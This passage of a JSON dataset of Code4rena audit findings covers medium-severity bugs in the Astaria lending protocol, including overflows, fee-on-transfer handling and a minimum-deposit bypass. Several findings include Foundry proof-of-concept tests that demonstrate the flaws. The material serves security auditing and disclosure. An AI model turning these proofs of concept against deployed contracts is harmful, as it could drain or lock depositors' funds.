      "summary": "\nA bug has been discovered in the `minDepositAmount()` function of Public Vaults. The function is intended to protect against attacks like the 4626 front running attack by ensuring that all depositors deposit more than dust. For assets with 18 decimals, this calculation is reasonable, as the minimum deposit is just 100 gwei (1/10k of a USD). However, for other assets, the formula returns 0.1 tokens, regardless of value. This is far out of line with the expected 1/10,000 USD for tokens with 18 decimals, and for tokens like WBTC, the minimum deposit is over $2000 USD, which is too high for many users.\n\nTo mitigate this bug, a custom formula has been recommended which ensures a small final result in all cases. For example, if the ERC20 asset has less than 4 decimals, the formula will return 10**(ERC20(asset()).decimals() - 1). If the asset has less than 8 decimals, the formula will return 10**(ERC20(asset()).decimals() - 2), and if the asset has more than 8 decimals, the formula will return 10**(ERC20(asset()).decimals() - 6). This has been confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/367",
      "tags": [],
      "finders": [
        "bin2chen",
        "0xcm",
        "Tointer",
        "obront",
        "zaskoh"
      ]
    },
    {
      "id": "25829",
      "title": "[M-13] Processing an epoch must be done in a timely manner, but can be halted by non liquidated expired liens",
      "impact": "MEDIUM",
      "content": "\nAs pointed out in the [Spearbit audit](https://github.com/spearbit-audits/review-astaria/issues/121):\n\n> If the processEpoch() endpoint does not get called regularly (especially close to the epoch boundaries), the updated currentEpoch would lag behind the actual expected value and this will introduce arithmetic errors in formulas regarding epochs and timestamps.\n\nThis can cause a problem because `processEpoch()` cannot be called when there are open liens, and liens may remain open in the event that a lien expires and isn't promptly liquidated.\n\n### Proof of Concept\n\n`processEpoch()` contains the following check to ensure that all liens are closed before the epoch is processed:\n\n    if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) {\n      revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);\n    }\n\nThe accounting considers a lien open (via `s.epochData[s.currentEpoch].liensOpenForEpoch`) unless this value is decremented, which happens in three cases: when (a) the full payment is made, (b) the lien is bought out, or (c) the lien is liquidated.\n\nIn the event that a lien expires and nobody calls `liquidate()` (for example, if the NFT seems worthless and no other user wants to pay the gas to execute the function for the fee), this would cause `processEpoch()` to fail, and could create delays in the epoch processing and cause the accounting issues pointed out in the previous audit.\n\n### Recommended Mitigation Steps\n\nAstaria should implement a monitoring solution to ensure that `liquidate()` is always called promptly for expired liens, and that `processEpoch()` is always called promptly when the epoch ends.\n\n**[SantiagoGregory (Astaria) acknowledged and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/369#issuecomment-1412914783):**\n > Yes, us and strategists know to be monitoring vaults to process epochs.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the Astaria platform, which could cause delays in the epoch processing and cause arithmetic errors in formulas regarding epochs and timestamps. This is due to the processEpoch() endpoint not being called regularly, especially close to the epoch boundaries. This can happen if there are open liens and they remain open when a lien expires and isn't promptly liquidated. To mitigate this issue, Astaria should implement a monitoring solution to ensure that liquidate() is always called promptly for expired liens, and that processEpoch() is always called promptly when the epoch ends. The Astaria team has acknowledged this issue and has stated that they are monitoring vaults to process epochs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/369",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "25828",
      "title": "[M-12] yIntercept of public vaults can overflow",
      "impact": "MEDIUM",
      "content": "\nThe yIntercept of a public vault can overflow due to an unchecked addition. As a result, totalAsset will be a lot lower than the actual amount, which prevents liquidity providers from withdrawing a large fraction of their assets.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L323-L325>\n\nThe amount of assets required for this to happen is barely feasible for a regular 18 decimal ERC20 token, but can happen with ease for tokens with higher precision.\n\n### Proof of Concept\n\n    pragma solidity =0.8.17;\n\n    import \"forge-std/Test.sol\";\n\n    import {Authority} from \"solmate/auth/Auth.sol\";\n    import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n    import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\n    import {\n      MultiRolesAuthority\n    } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n\n    import {ERC721} from \"gpl/ERC721.sol\";\n    import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\n    import {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\";\n    import {VaultImplementation} from \"../VaultImplementation.sol\";\n    import {PublicVault} from \"../PublicVault.sol\";\n    import {TransferProxy} from \"../TransferProxy.sol\";\n    import {WithdrawProxy} from \"../WithdrawProxy.sol\";\n\n    import {Strings2} from \"./utils/Strings2.sol\";\n\n    import \"./TestHelpers.t.sol\";\n    import {OrderParameters} from \"seaport/lib/ConsiderationStructs.sol\";\n\n    contract AstariaTest is TestHelpers {\n      using FixedPointMathLib for uint256;\n      using CollateralLookup for address;\n      using SafeCastLib for uint256;\n\n      event NonceUpdated(uint256 nonce);\n      event VaultShutdown();\n\n      function testYinterceptOverflow() public {\n        \n        address publicVault = _createPublicVault({\n          strategist: strategistOne,\n          delegate: strategistTwo,\n          epochLength: 14 days\n        });\n        _lendToVault(\n          Lender({addr: address(1), amountToLend: 309000000 ether}),\n          publicVault\n        );\n        _lendToVault(\n          Lender({addr: address(2), amountToLend: 10000000 ether}),\n          publicVault\n        );\n        assertTrue(PublicVault(publicVault).totalAssets() < 10000000 ether);\n        \n      }\n    }\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nRemove the unchecked block.\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the yIntercept of a public vault which can lead to an overflow due to an unchecked addition. This can cause the totalAsset to be a lot lower than the actual amount, which in turn prevents liquidity providers from withdrawing a large fraction of their assets. The bug is more likely to occur with tokens with higher precision. VSCode and Foundry were used to identify the bug, and the recommended mitigation step is to remove the unchecked block.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/388",
      "tags": [],
      "finders": [
        "evan"
      ]
    },
    {
      "id": "25827",
      "title": "[M-11] Liquidator reward is not taken into account when calculating potential debt",
      "impact": "MEDIUM",
      "content": "\nLiquidator reward is not taken into account when calculating potential debt. When liquidationInitialAsk is set to the bare minimum, liquidator reward will always come at the expense of vaults late on in the stack.\n\n### Proof of Concept\n\nConsider the following test where the vault loses more than 3 tokens.\n\n    pragma solidity =0.8.17;\n\n    import \"forge-std/Test.sol\";\n\n    import {Authority} from \"solmate/auth/Auth.sol\";\n    import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n    import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\n    import {\n      MultiRolesAuthority\n    } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n\n    import {ERC721} from \"gpl/ERC721.sol\";\n    import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\n    import {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\";\n    import {VaultImplementation} from \"../VaultImplementation.sol\";\n    import {PublicVault} from \"../PublicVault.sol\";\n    import {TransferProxy} from \"../TransferProxy.sol\";\n    import {WithdrawProxy} from \"../WithdrawProxy.sol\";\n    import {Vault} from \"../Vault.sol\";\n\n    import {Strings2} from \"./utils/Strings2.sol\";\n\n    import \"./TestHelpers.t.sol\";\n    import {OrderParameters} from \"seaport/lib/ConsiderationStructs.sol\";\n\n    contract AstariaTest is TestHelpers {\n      using FixedPointMathLib for uint256;\n      using CollateralLookup for address;\n      using SafeCastLib for uint256;\n\n      event NonceUpdated(uint256 nonce);\n      event VaultShutdown();\n\n      function testProfitFromLiquidatorFee() public {\n\n        TestNFT nft = new TestNFT(1);\n        address tokenContract = address(nft);\n        uint256 tokenId = uint256(0);\n\n        address publicVault = _createPublicVault({\n          strategist: strategistOne,\n          delegate: strategistTwo,\n          epochLength: 7 days\n        });\n        _lendToVault(\n          Lender({addr: address(1), amountToLend: 60 ether}),\n          publicVault\n        );\n\n        (, ILienToken.Stack[] memory stack) = _commitToLien({\n          vault: publicVault,\n          strategist: strategistOne,\n          strategistPK: strategistOnePK,\n          tokenContract: tokenContract,\n          tokenId: tokenId,\n          lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 150) / (365 days),\n            duration: 10 days,\n            maxPotentialDebt: 0 ether,\n            liquidationInitialAsk: 42 ether\n          }),\n          amount: 40 ether,\n          isFirstLien: true\n        });\n\n        vm.warp(block.timestamp + 10 days);\n        OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(\n          stack,\n          uint8(0)\n        );\n\n        _bid(Bidder(bidder, bidderPK), listedOrder, 42 ether);\n        assertTrue(WETH9.balanceOf(publicVault) < 57 ether);\n      }\n    }\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nInclude liquidator reward in the calculation of potential debt.\n\n**[androolloyd (Astaria) disputed and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/400#issuecomment-1416270111):**\n > This is working as intended.\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/400#issuecomment-1441302402):**\n > @androolloyd could you expand on this? Wouldn't it be safer and avoid eventual loss of funds to ensure that the eventual liquidator reward is included in `liquidationInitialAsk`?\n\n\n\n***\n\n",
      "summary": "\nBug Report Summary:\n\nThis bug report concerns the Astaria protocol, where liquidator reward is not taken into account when calculating potential debt. When liquidationInitialAsk is set to the bare minimum, liquidator reward will always come at the expense of vaults late on in the stack. The bug was tested using a Solidity contract, where a vault loses more than 3 tokens and the liquidator reward was not taken into account. \n\nThe bug was disputed by androolloyd (Astaria), who commented that this was working as intended. Picodes (judge) then commented that it would be safer and avoid eventual loss of funds to ensure that the eventual liquidator reward is included in liquidationInitialAsk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/400",
      "tags": [],
      "finders": [
        "evan",
        "ladboy233"
      ]
    },
    {
      "id": "25826",
      "title": "[M-10] Public vault slope can overflow",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L562-L568><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/57c2fe33c1d57bc2814bfd23592417fc4d5bf7de/src/LienToken.sol#L702-L704>\n\nThe slope of public vault can overflow in the afterPayment function due to unchecked addition. When this happens, totalAssets will not be correct. This can also result in underflows in slope updates elsewhere, causing large fluctuations in slope and totalAssets.\n\n### Proof of Concept\n\nAssume the token is a normal 18 decimal ERC20 token.<br>\nAfter 5 loans of 1000 tokens, all with the maximum interest rate of 63419583966, the slope will overflow.<br>\n`5 * 1000 * 63419583966 / 2^48 = 1.1265581173`\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nRemove the unchecked block. Also, I think 48 bits might not be enough for slope.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/418)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an overflow issue in the \"PublicVault.sol\" and \"LienToken.sol\" files of the Astaria project. This overflow occurs in the \"afterPayment\" function due to unchecked addition, which can result in incorrect values for \"totalAssets\" and large fluctuations in \"slope\".\n\nTo demonstrate the issue, a proof of concept was created using a normal 18 decimal ERC20 token. After 5 loans of 1000 tokens, all with the maximum interest rate of 63419583966, the slope will overflow. The tools used for this proof of concept was VSCode.\n\nThe recommended mitigation steps for this issue is to remove the unchecked block and consider increasing the bits used for slope. This bug was confirmed by SantiagoGregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/418",
      "tags": [],
      "finders": [
        "evan"
      ]
    },
    {
      "id": "25825",
      "title": "[M-09] Tokens with fee on transfer are not supported in `PublicVault.sol`",
      "impact": "MEDIUM",
      "content": "\nSome tokens take a transfer fee (e.g. `STA`, `PAXG`), some do not currently charge a fee but may do so in the future (e.g. `USDT`, `USDC`).\n\nShould a fee-on-transfer token be added to the `PublicVault`, the tokens will be locked in the `PublicVault.sol` contract. Depositors will be unable to withdraw their rewards.\nIn the current implementation, it is assumed that the received amount is the same as the transfer amount. However, due to how fee-on-transfer tokens work, much less will be received than what was transferred.\n\nAs a result, later users may not be able to successfully withdraw their shares, as it may revert at <https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L148> when `WithdrawProxy` is called due to insufficient balance.\n\n### Proof of Concept\n\ni.e. Fee-on-transfer scenario:<br>\nContract calls transfer from contractA 100 tokens to current contract<br>\nCurrent contract thinks it received 100 tokens<br>\nIt updates balances to increase +100 tokens<br>\nWhile actually contract received only 90 tokens<br>\nThat breaks whole math for given token\n\n```solidity\n  function deposit(uint256 amount, address receiver)\n    public\n    override(ERC4626Cloned)\n    whenNotPaused\n    returns (uint256)\n  {\n    VIData storage s = _loadVISlot();\n    if (s.allowListEnabled) {\n      require(s.allowList[receiver]);\n    }\n\n    uint256 assets = totalAssets();\n\n    return super.deposit(amount, receiver);\n  }\n```\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L251-L265>\n\n      function _redeemFutureEpoch(\n        VaultData storage s,\n        uint256 shares,\n        address receiver,\n        address owner,\n        uint64 epoch\n      ) internal virtual returns (uint256 assets) {\n        // check to ensure that the requested epoch is not in the past\n\n        ERC20Data storage es = _loadERC20Slot();\n\n        if (msg.sender != owner) {\n          uint256 allowed = es.allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n          if (allowed != type(uint256).max) {\n            es.allowance[owner][msg.sender] = allowed - shares;\n          }\n        }\n\n        if (epoch < s.currentEpoch) {\n          revert InvalidState(InvalidStates.EPOCH_TOO_LOW);\n        }\n        require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n        // check for rounding error since we round down in previewRedeem.\n\n        //this will underflow if not enough balance\n        es.balanceOf[owner] -= shares;\n\n        // Cannot overflow because the sum of all user\n        // balances can't exceed the max uint256 value.\n        unchecked {\n          es.balanceOf[address(this)] += shares;\n        }\n\n        emit Transfer(owner, address(this), shares);\n        // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch\n        _deployWithdrawProxyIfNotDeployed(s, epoch);\n\n        emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n        // WithdrawProxy shares are minted 1:1 with PublicVault shares\n        WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);\n      }\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L148-L190>\n\nThese functions inherits functions from the `ERC4626-Cloned.sol`<br>\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol>\n\n```solidity\n  function deposit(uint256 assets, address receiver)\n    public\n    virtual\n    returns (uint256 shares)\n  {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n    require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\");\n    // Need to transfer before minting or ERC777s could reenter.\n    ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    emit Deposit(msg.sender, receiver, assets, shares);\n\n    afterDeposit(assets, shares);\n  }\n\n```\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L19-L36>\n\n### Recommended Mitigation Steps\n\n1.  Consider comparing before and after balance to get the actual transferred amount.\n2.  Alternatively, disallow tokens with fee-on-transfer mechanics to be added as tokens.\n\n**[androolloyd (Astaria) acknowledged](https://github.com/code-423n4/2023-01-astaria-findings/issues/424)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem with the `PublicVault.sol` contract, which is part of the Astaria project. The issue is that some tokens take a transfer fee (e.g. `STA`, `PAXG`), while others do not currently charge a fee but may do so in the future (e.g. `USDT`, `USDC`). If a fee-on-transfer token is added to the `PublicVault` contract, depositors will be unable to withdraw their rewards. This is because the current implementation assumes that the received amount is the same as the transfer amount, but due to how fee-on-transfer tokens work, much less will be received than what was transferred. This will cause later users to be unable to successfully withdraw their shares, as it may revert due to insufficient balance.\n\nTo demonstrate this, a proof of concept was provided. In this scenario, the contract calls a transfer of 100 tokens from contractA to the current contract. The current contract thinks it received 100 tokens, and updates balances to increase by +100 tokens. However, the contract actually only received 90 tokens, which breaks the math for the given token.\n\nThe recommended mitigation steps for this issue are to consider comparing before and after balance to get the actual transferred amount, or to disallow tokens with fee-on-transfer mechanics to be added as tokens. The bug report was acknowledged by androolloyd (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/424",
      "tags": [],
      "finders": [
        "peakbolt",
        "Rolezn"
      ]
    },
    {
      "id": "25824",
      "title": "[M-08] Public vault strategist reward is not calculated correctly",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L597-L609><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L819>\n\nStrategist interest reward is not calculated correctly. The reward will almost always be calculated with interestOwed, regardless of the amount paid.\n\nAs a result, the strategist gets paid more than they are supposed to. Even if the borrower hasn't made a single payment, the strategist can make a tiny payment on behalf of the borrower to trigger this calculation.\n\nThis also encourages the strategist to maximize interestOwed and make tiny payments on behalf of the borrower. This can trigger a compound interest vulnerability which I've made a separate report about.\n\n### Proof of Concept\n\nAs confirmed by the sponsor, the strategist reward is supposed to be \"paid on performance and only\\@on interest. if the payment that’s being made is greater than the interest owing we only mint them based on the interest owed, but if it’s less, then, mint their shares based on the amount\"\n\nHowever, this is not the case. When LienToken calls beforePayment, which calls \\_handleStrategistInterestReward, the amount passed in is the amount of the lien (stack.point.amount), not the amount paid.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L819><br>\nI believe `stack.point.amount` should be changed to `amount`.\n\n**[androolloyd (Astaria) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/435#issuecomment-1406792466):**\n > Since we track payments against the principle via stack.point.amount, then you want to ensure that what were sending them is the correct amount. Lien data doesnt track the balance of a loan, only the max value a lien can have.\n\n**[SantiagoGregory (Astaria) acknowledged](https://github.com/code-423n4/2023-01-astaria-findings/issues/435)**\n\n**[Picodes (judge) commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/435#issuecomment-1439648798):**\n > `stack.point.amount`, which represents the remaining debt amount should be replaced by the amount actually paid to mitigate this attack.\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the Astaria codebase, where the Strategist interest reward is not calculated correctly. The reward is almost always calculated with interestOwed, regardless of the amount paid. This can lead to the Strategist being paid more than they are supposed to, and encourages them to maximize interestOwed and make tiny payments on behalf of the borrower. This can trigger a compound interest vulnerability.\n\nThe bug occurs when the LienToken calls beforePayment, which calls _handleStrategistInterestReward, and the amount passed in is the amount of the lien (stack.point.amount), not the amount paid. This should be changed to the amount actually paid, to mitigate the attack.\n\nThe bug was confirmed by the sponsor, who said the Strategist reward should be paid only on interest, and if the payment is greater than the interest owing, only mint them based on the interest owed, but if it’s less, then, mint their shares based on the amount.\n\nThe tools used to detect the bug were VSCode, and the recommended mitigation steps are to change `stack.point.amount` to `amount`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/435",
      "tags": [],
      "finders": [
        "evan",
        "PaludoX0"
      ]
    },
    {
      "id": "25823",
      "title": "[M-07] Improper Approval Mechanism of Clearing House",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/ClearingHouse.sol#L148-L151><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/ClearingHouse.sol#L160-L165><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L637-L641><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/CollateralToken.sol#L566-L577>\n\nThe `ClearingHouse` implementation performs a `@solmate`-based `safeApprove` instruction (\\[1]) with the remaining `balanceOf(address(this))` but contains code handling any remainder of funds that may remain in the contract \\[2]. Investigation of the `payDebtViaClearingHouse` function will indicate that the function may not consume the maximum approval that was set to the `TRANSFER_PROXY` \\[3].\n\nAs a result, any consequent invocation of `_execute` via `safeTransferFrom` from OpenSea with a `paymentToken` (i.e. `identifier`) such as USDT would fail. Given that the `ClearingHouse` of a particular `collateralId` is created only once, this vulnerability will impact consequent listings and cause them to fatally fail for a token that has been used in the past and is part of the non-compliant EIP-20 tokens, with USDT being the prime and most popular example.\n\nThe code in USDT that causes this complication is as follows:\n\n```sol\nrequire(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n```\n\n### Proof of Concept\n\nThe vulnerability is clearly defined above, however, for testing purposes, the `ClearingHouse::safeTransferFrom` function of a particular clearing house instance can be invoked twice with the same arguments. The second invocation will fail provided that the first invocation provided a token balance that exceeds the number of funds necessary for the debt payment which should be denoted in USDT.\n\nOn an important note, if the code used `safeApprove` from `@openzeppelin` this issue would affect any token, however, it is limited to non-standard tokens due to the usage of the `@solmate` implementation of `safeApprove`.\n\n### Tools Used\n\nManual review of the codebase. Historically, findings pertaining to incorrect approval mechanisms that do not support USDT have been marked as \"medium\" in severity in the past in the following cases:\n\n*   [Rubicon](https://code4rena.com/reports/2022-05-rubicon/#m-08-usdt-is-not-supported-because-of-approval-mechanism)\n*   [Duality Focus](https://code4rena.com/reports/2022-04-dualityfocus/#m-03-not-calling-approve0-before-setting-a-new-approval-causes-the-call-to-revert-when-used-with-tether-usdt)\n\n### Recommended Mitigation Steps\n\nWe advise approvals to be properly handled by evaluating whether a non-zero approval already exists and in such an instance nullifying it before re-setting it to a non-zero value. Example below:\n\n```sol\n// Optimizing lookup\naddress transferProxy = address(ASTARIA_ROUTER.TRANSFER_PROXY());\n\n// If existing approval is non-zero -> set it to zero\nif (ERC20(paymentToken).allowance(address(this), transferProxy) != 0) {\n    ERC20(paymentToken).safeApprove(transferProxy, 0);\n}\n\n// Set non-zero approval\nERC20(paymentToken).safeApprove(transferProxy, payment - liquidatorPayment);\n```\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding the `ClearingHouse` implementation of the code-423n4/2023-01-astaria repository. The implementation performs a `@solmate`-based `safeApprove` instruction, however it contains code handling any remainder of funds that may remain in the contract. The `payDebtViaClearingHouse` function may not consume the maximum approval that was set to the `TRANSFER_PROXY`. This will cause consequent invocations of `_execute` via `safeTransferFrom` from OpenSea with a `paymentToken` such as USDT to fail. \n\nTo test the vulnerability, the `ClearingHouse::safeTransferFrom` function of a particular clearing house instance can be invoked twice with the same arguments. The second invocation will fail provided that the first invocation provided a token balance that exceeds the number of funds necessary for the debt payment which should be denoted in USDT.\n\nTo mitigate this issue, the code should be modified to evaluate whether a non-zero approval already exists and in such an instance nullifying it before re-setting it to a non-zero value. An example of this code is provided in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/472",
      "tags": [],
      "finders": [
        "tsvetanovv",
        "ayeslick",
        "0xsomeone"
      ]
    },
    {
      "id": "25822",
      "title": "[M-06] For a public vault, minimum deposit requirement that is enforced by `ERC4626Cloned.deposit` function can be bypassed by `ERC4626Cloned.mint` function or vice versa when share price does not equal one",
      "impact": "MEDIUM",
      "content": "\nThe following `ERC4626Cloned.deposit` function has `require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\")` as the minimum deposit requirement, and the `ERC4626Cloned.mint` function below has `require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\")` as the minimum deposit requirement. For a public vault, when the share price becomes different than 1, these functions' minimum deposit requirements are no longer the same. For example, given `S` is the `shares` input value for the `ERC4626Cloned.mint` function and `A` equals `ERC4626Cloned.previewMint(S)`, when the share price is bigger than 1 and `A` equals `minDepositAmount() + 1`, such `A` will violate the `ERC4626Cloned.deposit` function's minimum deposit requirement but the corresponding `S` will not violate the `ERC4626Cloned.mint` function's minimum deposit requirement; in this case, the user can just ignore the `ERC4626Cloned.deposit` function and call `ERC4626Cloned.mint` function to become a liquidity provider. Thus, when the public vault's share price is different than 1, the liquidity provider can call the less restrictive function out of the two so the minimum deposit requirement enforced by one of the two functions is not effective at all; this can result in unexpected deposit amounts and degraded filtering of who can participate as a liquidity provider.\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L19-L36>\n\n```solidity\n  function deposit(uint256 assets, address receiver)\n    public\n    virtual\n    returns (uint256 shares)\n  {\n    // Check for rounding error since we round down in previewDeposit.\n    require((shares = previewDeposit(assets)) != 0, \"ZERO_SHARES\");\n\n    require(shares > minDepositAmount(), \"VALUE_TOO_SMALL\");\n    // Need to transfer before minting or ERC777s could reenter.\n    ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    ...\n  }\n```\n\n<https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626-Cloned.sol#L38-L52>\n\n```solidity\n  function mint(\n    uint256 shares,\n    address receiver\n  ) public virtual returns (uint256 assets) {\n    assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up.\n    require(assets > minDepositAmount(), \"VALUE_TOO_SMALL\");\n    // Need to transfer before minting or ERC777s could reenter.\n    ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets);\n\n    _mint(receiver, shares);\n\n    ...\n  }\n```\n\n### Proof of Concept\n\nPlease add the following test in `src\\test\\AstariaTest.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n  function testMinimumDepositRequirementForPublicVaultThatIsEnforcedByDepositFunctionCanBeBypassedByMintFunctionOfERC4626ClonedContractWhenSharePriceIsNotOne() public {\n    uint256 budget = 50 ether;\n    address alice = address(1);\n    address bob = address(2);\n    vm.deal(bob, budget);\n\n    TestNFT nft = new TestNFT(2);\n    _mintNoDepositApproveRouter(address(nft), 5);\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(0);\n\n    address publicVault = _createPublicVault({\n      strategist: strategistOne,\n      delegate: strategistTwo,\n      epochLength: 14 days\n    });\n\n    // after alice deposits 50 ether WETH in publicVault, publicVault's share price becomes 1\n    _lendToVault(Lender({addr: alice, amountToLend: budget}), publicVault);\n\n    // the borrower borrows 10 ether WETH from publicVault\n    (, ILienToken.Stack[] memory stack1) = _commitToLien({\n      vault: publicVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: tokenId,\n      lienDetails: standardLienDetails,\n      amount: 10 ether,\n      isFirstLien: true\n    });\n    uint256 collateralId = tokenContract.computeId(tokenId);\n\n    // the borrower repays for the lien after 9 days, and publicVault's share price becomes bigger than 1\n    vm.warp(block.timestamp + 9 days);\n    _repay(stack1, 0, 100 ether, address(this));\n\n    vm.startPrank(bob);\n\n    // bob owns 50 ether WETH\n    WETH9.deposit{value: budget}();\n    WETH9.approve(publicVault, budget);\n\n    uint256 assetsIn = 100 gwei + 1;\n\n    // for publicVault at this moment, 99265705739 shares are equivalent to (100 gwei + 1) WETH according to previewMint function\n    uint256 sharesIn = IERC4626(publicVault).convertToShares(assetsIn);\n    assertEq(sharesIn, 99265705739);\n    assertEq(IERC4626(publicVault).previewMint(sharesIn), assetsIn);\n    \n    // bob is unable to call publicVault's deposit function for depositing (100 gwei + 1) WETH\n    vm.expectRevert(bytes(\"VALUE_TOO_SMALL\"));\n    IERC4626(publicVault).deposit(assetsIn, bob);\n\n    // bob is also unable to call publicVault's deposit function for depositing a little more than (100 gwei + 1) WETH\n    vm.expectRevert(bytes(\"VALUE_TOO_SMALL\"));\n    IERC4626(publicVault).deposit(assetsIn + 100, bob);\n\n    // however, bob is able to call publicVault's mint function for minting 99265705739 shares while transferring (100 gwei + 1) WETH to publicVault\n    IERC4626(publicVault).mint(sharesIn, bob);\n\n    vm.stopPrank();\n  }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe `ERC4626Cloned.deposit` function can be updated to directly compare the `assets` input to `minDepositAmount()` for the minimum deposit requirement while keeping the `ERC4626Cloned.mint` function as is. Alternatively, the `ERC4626Cloned.mint` function can be updated to directly compare the `shares` input to `minDepositAmount()` for the minimum deposit requirement while keeping the `ERC4626Cloned.deposit` function as is.\n\n**[SantiagoGregory (Astaria) 